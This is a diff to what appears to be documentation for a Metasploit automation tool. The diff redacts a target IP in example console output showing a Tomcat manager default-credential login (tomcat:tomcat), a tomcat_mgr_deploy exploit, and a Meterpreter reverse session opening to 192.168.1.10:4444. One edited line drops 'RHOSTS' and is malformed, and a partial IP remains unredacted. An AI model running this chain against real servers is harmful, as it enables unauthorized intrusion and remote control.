@@ -67,15 +67,15 @@ msfconsole -q -r metexfo.rc
 
 ```text
 resource (metexfo_final_agent.rc)> use auxiliary/scanner/http/tomcat_mgr_login
-resource (metexfo_final_agent.rc)> set RHOSTS 193.255.45.112
+resource (metexfo_final_agent.rc)> set RHOSTS 193.255.xxx.xxx
 resource (metexfo_final_agent.rc)> set RPORT 8080
 resource (metexfo_final_agent.rc)> run
 [+] http://193.255.45 - Tomcat Manager LOGIN SUCCESSFUL: tomcat:tomcat
 [*] Auxiliary module execution completed
 
 [*] Upgrading session to exploit/multi/http/tomcat_mgr_deploy...
-[*] Sending stage (175641 bytes) to 193.255.45.112
-[+] Meterpreter session 1 opened (192.168.1.10:4444 -> 193.255.45.112:49231)
+[*] Sending stage (175641 bytes) to 193.255.xxx.xxx
+[+] Meterpreter session 1 opened (192.168.1.10:4444 -> 193.255.xxx.xxx:49231)
 
 meterpreter > sysinfo
 Computer        : HEDEF-SISTEM-01
@@ -124,15 +124,15 @@ When the compiled blueprint runs against the TARGET SYSTEM and compromises the h
 
 ```text
 resource (metexfo_final_agent.rc)> use auxiliary/scanner/http/tomcat_mgr_login
-resource (metexfo_final_agent.rc)> set RHOSTS 193.255.45.112
+resource (metexfo_final_agent.rc)> set 193.255.xxx.xxx
 resource (metexfo_final_agent.rc)> set RPORT 8080
 resource (metexfo_final_agent.rc)> run
 [+] http://193.255.45 - Tomcat Manager LOGIN SUCCESSFUL: tomcat:tomcat
 [*] Auxiliary module execution completed
 
 [*] Upgrading session to exploit/multi/http/tomcat_mgr_deploy...
-[*] Sending stage (175641 bytes) to 193.255.45.112
-[+] Meterpreter session 1 opened (192.168.1.10:4444 -> 193.255.45.112:49231)
+[*] Sending stage (175641 bytes) to 193.255.xxx.xxx
+[+] Meterpreter session 1 opened (192.168.1.10:4444 -> 193.255.xxx.xxx:49231)
 
 meterpreter > sysinfo
 Computer        : TARGET-SYSTEM-01
